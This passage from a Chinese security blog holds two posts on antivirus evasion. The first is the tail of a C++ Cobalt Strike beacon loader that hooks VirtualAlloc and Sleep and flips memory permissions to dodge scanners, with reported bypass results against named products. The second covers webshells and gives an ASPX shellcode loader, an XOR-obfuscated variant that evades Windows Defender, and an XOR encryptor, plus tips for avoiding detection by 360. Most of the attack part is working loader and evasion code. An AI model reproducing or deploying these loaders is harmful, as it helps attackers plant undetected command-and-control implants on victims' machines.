class="built_in">VirtualFree</span>(shellcode_addr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">		Vir_FLAG = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The time of Sleep:%d\n&quot;</span>, dwMilliseconds);</span><br><span class="line">	<span class="built_in">SetEvent</span>(hEvent);</span><br><span class="line">	<span class="built_in">OldSleep</span>(dwMilliseconds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对函数进行inlineHook</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Hook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">DetourRestoreAfterWith</span>(); <span class="comment">//避免重复HOOK</span></span><br><span class="line">	<span class="built_in">DetourTransactionBegin</span>(); <span class="comment">// 开始HOOK</span></span><br><span class="line">	<span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">	<span class="built_in">DetourAttach</span>((PVOID*)&amp;OldVirtualAlloc, NewVirtualAlloc);</span><br><span class="line">	<span class="built_in">DetourAttach</span>((PVOID*)&amp;OldSleep, NewSleep);</span><br><span class="line">	<span class="built_in">DetourTransactionCommit</span>(); <span class="comment">//  提交HOOK</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解除对函数的inlineHook</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">DetourTransactionBegin</span>();</span><br><span class="line">	<span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">	<span class="built_in">DetourDetach</span>((PVOID*)&amp;OldVirtualAlloc, NewVirtualAlloc);</span><br><span class="line">	<span class="built_in">DetourTransactionCommit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断异常代码的地址是否在Beacon内存的范围之内</span></span><br><span class="line"><span class="function">BOOL <span class="title">is_Exception</span><span class="params">(DWORD64 Exception_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (Exception_addr &lt; ((DWORD64)Beacon_address + Beacon_data_len) &amp;&amp; Exception_addr &gt;(DWORD64)Beacon_address)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;The Exception Address is a match:%llx\n&quot;</span>, Exception_addr);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The Exception Address not a match:%llx\n&quot;</span>, Exception_addr);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义VEH的异常处理函数</span></span><br><span class="line"><span class="function">LONG NTAPI <span class="title">FirstVectExcepHandler</span><span class="params">(PEXCEPTION_POINTERS pExcepInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FirstVectExcepHandler\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The Exception Code is :%x\n&quot;</span>, pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The Thread Address is :%llx\n&quot;</span>, pExcepInfo-&gt;ContextRecord-&gt;Rip);		   </span><br><span class="line">	<span class="keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="number">0xc0000005</span> &amp;&amp; <span class="built_in">is_Exception</span>(pExcepInfo-&gt;ContextRecord-&gt;Rip))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Modify the memory attribute to executable\n&quot;</span>);</span><br><span class="line">		<span class="built_in">VirtualProtect</span>(Beacon_address, Beacon_data_len, PAGE_EXECUTE_READWRITE, &amp;Beacon_Memory_address_flOldProtect);</span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数，用于将Beacon的内存属性设置为可读写，即去掉可执行权限</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">Beacon_set_Memory_attributes</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Set Beacon memory attribute unexecutable\n&quot;</span>);</span><br><span class="line">		<span class="built_in">VirtualProtect</span>(Beacon_address, Beacon_data_len, PAGE_READWRITE, &amp;Beacon_Memory_address_flOldProtect);</span><br><span class="line">		<span class="built_in">ResetEvent</span>(hEvent);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制中的单个字符转换为相应的整数值</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">hexCharToByte</span><span class="params">(<span class="type">char</span> character)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (character &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> character - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (character &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> character - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (character &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> character - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制字符串转换成字节型数组</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hexStringToBytes</span><span class="params">(<span class="type">const</span> std::string&amp; hexString, <span class="type">unsigned</span> <span class="type">char</span>* byteArray, <span class="type">int</span> byteArraySize)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; hexString.<span class="built_in">length</span>(); i += <span class="number">2</span>) &#123;</span><br><span class="line">		byteArray[i / <span class="number">2</span>] = <span class="built_in">hexCharToByte</span>(hexString[i]) * <span class="number">16</span> + <span class="built_in">hexCharToByte</span>(hexString[i + <span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	</span><br><span class="line">	hEvent = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, TRUE, <span class="literal">false</span>, <span class="literal">NULL</span>); <span class="comment">// 创建事件(一开始无信号)</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, &amp;FirstVectExcepHandler); <span class="comment">// 添加异常处理函数</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">Hook</span>(); <span class="comment">//开始Hook</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建线程</span></span><br><span class="line">	HANDLE hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Beacon_set_Memory_attributes, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function">std::ifstream <span class="title">file</span><span class="params">(<span class="string">&quot;beacon_hex.txt&quot;</span>)</span></span>;  <span class="comment">//打开指定文件</span></span><br><span class="line">	<span class="type">size_t</span> size;  <span class="comment">//定义文件内容的字节数</span></span><br><span class="line">	string contents; <span class="comment">//定义文件内容</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断文件是否打开成功</span></span><br><span class="line">	<span class="keyword">if</span> (file.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">		std::stringstream buffer; <span class="comment">//创建一个stringstream对象</span></span><br><span class="line">		buffer &lt;&lt; file.<span class="built_in">rdbuf</span>();  <span class="comment">//将文件的内容复制到该流中</span></span><br><span class="line">		contents = buffer.<span class="built_in">str</span>();  <span class="comment">//将stringstream对象的内容转换string,并将其存储在contents中</span></span><br><span class="line"></span><br><span class="line">		size = contents.<span class="built_in">length</span>() / <span class="number">2</span>;  <span class="comment">//由于两个十六进制相当于一个字节,因此文件内容长度需除以2</span></span><br><span class="line">		file.<span class="built_in">close</span>();  <span class="comment">//关闭文件</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 为shellcode申请一块内存</span></span><br><span class="line">	shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 调用函数将十六进制字符串转换为字节型数组</span></span><br><span class="line">	<span class="built_in">hexStringToBytes</span>(contents, (<span class="type">unsigned</span> <span class="type">char</span> *)shellcode_addr, size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 修改内存属性为可读写</span></span><br><span class="line">	<span class="built_in">VirtualProtect</span>(shellcode_addr, size, PAGE_EXECUTE_READWRITE, &amp;Beacon_Memory_address_flOldProtect);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 执行shellcode</span></span><br><span class="line">	(*(<span class="built_in">int</span>(*)()) shellcode_addr)();</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 解除Hook</span></span><br><span class="line">	<span class="built_in">UnHook</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>打开Cobalt Strike生成Raw格式的shellcode文件，注意要选择Stageless</p>
<p><img src="/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/image-20230621224537305.png" alt="image-20230621224537305">	</p>
<p>使用<code>BinToHex.py</code>将bin文件转为存放16进制字符串的文本文件，并将其与可执行文件放在同一目录</p>
<p><img src="/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/image-20230621224842193-16873589242881.png" alt="image-20230621224842193">	</p>
<p>运行可执行程序后，cs成功显示上线，数字杀软也没有报毒，在程序的控制台输出可以看到，分配了两段内存，第一段内存是为储存shellcode分配的，第二段是执行shellcode后它自己分配的，后续会将第一段内存给释放掉，然后修改第二段内存的属性来绕过杀软</p>
<p><img src="/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/image-20230621225435343.png" alt="image-20230621225435343"></p>
<p>我测试了下，某绒和数字杀软都能上线并执行命令，卡巴斯基之前是可以过的，但现在不行了。WindowsDefend也能上线，但是第二次回连被检测出了CS流量特征，以下是VT的杀毒查杀率</p>
<p><img src="/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/image-20230621230053519.png" alt="image-20230621230053519">	</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/783">https://forum.butian.net/share/783</a>	</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9399">https://xz.aliyun.com/t/9399</a></p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/Webshell%E4%B8%93%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
      <meta itemprop="name" content="Xiao Ni">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chensicha‘s blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/29/Webshell%E4%B8%93%E9%A2%98/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>4.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>在webshell上线木马，他的进程链是cmd，若双击木马，它的进程链是explorer.exe</p>
<h1 id="核晶查杀机制"><a href="#核晶查杀机制" class="headerlink" title="核晶查杀机制"></a>核晶查杀机制</h1><p>当我们在webshell终端执行cmd命令时，不要一上来就<code>whoami</code>，这样很容易会被杀软查杀，从而导致杀软的查杀力度越来越严格，毕竟360核晶是带机器学习引擎的</p>
<img src="Webshell专题/image-20230706100519333.png" alt="image-20230706100519333" style="zoom:67%;" />	



<p>最好先执行tasklist命令列出目标系统的所有进程，看看是否有杀毒软件</p>
<img src="Webshell专题/image-20230707210931111.png" alt="image-20230707210931111" style="zoom:67%;" />		



<p>有时候你执行calc.exe命令也会被核晶捕捉到，讲道理calc命令就是一个正常的命令，那么为什么会报毒呢？我觉得这可能是一开始你的一些操作被杀软捕捉到了，例如上述我说的执行whoami命令，一旦杀软的查杀力度上来了，你后面起的任何进程都会被查杀</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230706102328691.png" alt="image-20230706102328691">	</p>
<p>360核晶查杀还涉及到进程链问题，当我们在webshell终端执行notepad.exe命令时，它的cmd进程是起在w3wp.exe进程下</p>
<blockquote>
<p><code>w3wp.exe</code> 是 Windows Web 服务器 (IIS) 中的 Worker Process（工作进程）。在你的 web 应用程序接收到一个请求时，该请求实际上是由一个或多个这样的进程来处理的</p>
</blockquote>
<img src="Webshell专题/image-20230706104523446.png" alt="image-20230706104523446" style="zoom:67%;" />	



<p>如果在虚拟机中直接打开cmd执行notepad.exe，可以发现cmd进程是起在explorer进程下，这种方式起的进程是不会被杀软查杀的</p>
<img src="Webshell专题/image-20230706104945850.png" alt="image-20230706104945850" style="zoom:67%;" />	



<p>我将白+黑程序上传至目标主机，随后在目标主机中点击白程序，CS能够成功上线</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230707212917711.png" alt="image-20230707212917711"></p>
<p>但是在webshell的cmd终端执行白程序会被查杀，就连你劫持的哪个dll都会被杀软捕捉到</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230707213404445.png" alt="image-20230707213404445">		</p>
<h1 id="bypass核晶思路"><a href="#bypass核晶思路" class="headerlink" title="bypass核晶思路"></a>bypass核晶思路</h1><h2 id="1-aspx马加载shellcode"><a href="#1-aspx马加载shellcode" class="headerlink" title="1.aspx马加载shellcode"></a>1.aspx马加载shellcode</h2><h3 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h3><p>以下是aspx文件的代码，主要使用C#编写，导入了<code>System</code>和<code>System.Runtime.InteropServices</code>命名空间。</p>
<p>然后，它声明了两个P&#x2F;Invoke方法，这些方法是.NET中用于调用Windows API或者其他非.NET DLL的方法。这两个方法是<code>VirtualAlloc</code>和<code>CreateThread</code>，它们来自<code>kernel32.dll</code>，一个是Windows系统的核心库</p>
<p>接下来是<code>Page_Load</code>方法，这是ASP.NET页面生命周期中的一个重要事件。在页面首次加载和后续的请求中，它都会被触发</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; %&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System&quot;%&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System.Runtime.InteropServices&quot;%&gt;</span><br><span class="line">&lt;script language=&quot;c#&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">private static extern IntPtr CreateThread(uint lpThreadAttributes,uint dwStackSize, IntPtr lpStartAddress,IntPtr param, uint dwCreationFlags, ref uint lpThreadId);</span><br><span class="line"></span><br><span class="line">public void Page_Load(object sender, EventArgs e)&#123;</span><br><span class="line">	byte[] esc = new byte[928] &#123;“填写C#的shellcode”&#125;;</span><br><span class="line">	IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)esc.Length, 0x1000, 0x40);</span><br><span class="line">	Marshal.Copy(esc, 0, funcAddr, esc.Length);</span><br><span class="line">	IntPtr hThread = IntPtr.Zero;</span><br><span class="line">	uint threadId = 0;</span><br><span class="line">	IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">	hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">	Response.Write(&quot;CreateThread: 0x&quot; + hThread.ToString(&quot;x2&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">   return;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<p>在上述代码中，填写C#的shellcode要注意<code>w3wp.exe</code>的架构，w3wp.exe是IIS的工作进程，我们的aspx文件都是通过w3wp.exe来解析的，就如此处的<code>w3wp.exe</code>的架构是x64的，那就需要填写x64的shellcode</p>
<img src="Webshell专题/image-20230707120718329.png" alt="image-20230707120718329" style="zoom:67%;" />	



<p>360和火绒都不查杀此文件，但是WindowsDefender会查杀</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230707121418517.png" alt="image-20230707121418517">	</p>
<img src="Webshell专题/image-20230707221833150.png" alt="image-20230707221833150" style="zoom:67%;" />	



<p>网页访问aspx文件时，cobaltstrike上线成功，并且360核晶也没有拦截</p>
<img src="Webshell专题/image-20230707130455544.png" alt="image-20230707130455544" style="zoom: 50%;" />	

<p>​				</p>
<p>在beacon执行<code>getuid</code>命令也不会被拦截，简单总结下，此类技术之所以能躲避杀软的检测，是因为w3wp.exe进程本身是正常存在的，并且经常在正常操作中被使用，这也导致杀软不敢轻易就关掉此进程</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230707223429319.png" alt="image-20230707223429319"></p>
<h3 id="免杀处理"><a href="#免杀处理" class="headerlink" title="免杀处理"></a>免杀处理</h3><p>WindowsDefender会查杀aspx代码里的shellcode, 只需对shellcode进行异或加密就能绕过, 以下是修改后的aspx文件代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; %&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System&quot;%&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System.Runtime.InteropServices&quot;%&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System.Text&quot;%&gt;</span><br><span class="line">&lt;script language=&quot;c#&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">private static extern IntPtr CreateThread(uint lpThreadAttributes,uint dwStackSize, IntPtr lpStartAddress,IntPtr param, uint dwCreationFlags, ref uint lpThreadId);</span><br><span class="line"></span><br><span class="line">public void Page_Load(object sender, EventArgs e)&#123;</span><br><span class="line">    // 加密后的shellcode</span><br><span class="line">    byte[] esc = new byte[928] &#123; /* 省略 */ &#125;;</span><br><span class="line">    </span><br><span class="line">    // 解密密钥</span><br><span class="line">    byte[] key = System.Text.Encoding.UTF8.GetBytes(&quot;henry666&quot;);</span><br><span class="line"></span><br><span class="line">    // 解密shellcode</span><br><span class="line">    for (int i = 0; i &lt; esc.Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        esc[i] ^= key[i % key.Length];</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)esc.Length, 0x1000, 0x40);</span><br><span class="line">    Marshal.Copy(esc, 0, funcAddr, esc.Length);</span><br><span class="line">    IntPtr hThread = IntPtr.Zero;</span><br><span class="line">    uint threadId = 0;</span><br><span class="line">    IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">    Response.Write(&quot;CreateThread: 0x&quot; + hThread.ToString(&quot;x2&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">   return;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>以下是xor加密shellcode的C#代码</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 原始shellcode</span></span><br><span class="line">        <span class="built_in">byte</span>[] shellcode = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">928</span>] &#123;&#125;;</span><br><span class="line">            </span><br><span class="line">        <span class="comment">// 加密密钥</span></span><br><span class="line">        <span class="built_in">byte</span>[] key = Encoding.UTF8.GetBytes(<span class="string">&quot;henry666&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加密shellcode</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; shellcode.Length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            shellcode[i] ^= key[i % key.Length];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印加密后的shellcode</span></span><br><span class="line">        Console.Write(<span class="string">&quot;byte[] shellcode = new byte[&#123;0&#125;] &#123;&#123;&quot;</span>, shellcode.Length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; shellcode.Length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.Write(<span class="string">&quot;0x&#123;0&#125;&quot;</span>, shellcode[i].ToString(<span class="string">&quot;X2&quot;</span>));</span><br><span class="line">            <span class="keyword">if</span> (i != shellcode.Length - <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.Write(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Console.Write(<span class="string">&quot;&#125;;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 等待用户按下回车键</span></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;\n\nPress Enter to exit...&quot;</span>);</span><br><span class="line">        Console.ReadLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-jsp马研究"><a href="#2-jsp马研究" class="headerlink" title="2.jsp马研究"></a>2.jsp马研究</h2><p>webshell终端执行<code>tasklist</code>命令没有出现报毒</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230711120654971.png" alt="image-20230711120654971"></p>
<p>执行whoami也没有报毒，为啥asp的马会报毒呢？会不会是冰鞋</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230711120828955.png" alt="image-20230711120828955">	</p>
<p>运行白+黑时被杀软查杀了，查看进程链可以得知，cmd进程是起在javaw.exe下</p>
<blockquote>
<p><code>javaw.exe</code> 提供了一个运行环境，用于运行解析和执行 JSP 文件的 Servlet 容器</p>
</blockquote>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230711162006664.png" alt="image-20230711162006664">			</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230711161922059.png" alt="image-20230711161922059"></p>
<h2 id="3-php马"><a href="#3-php马" class="headerlink" title="3.php马"></a>3.php马</h2><p>​			</p>
<h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>​	</p>
<p>​	</p>
<p>​			</p>
<p>​		</p>
<p>​	</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/WeakDefender/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
      <meta itemprop="name" content="Xiao Ni">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chensicha‘s blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/29/WeakDefender/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
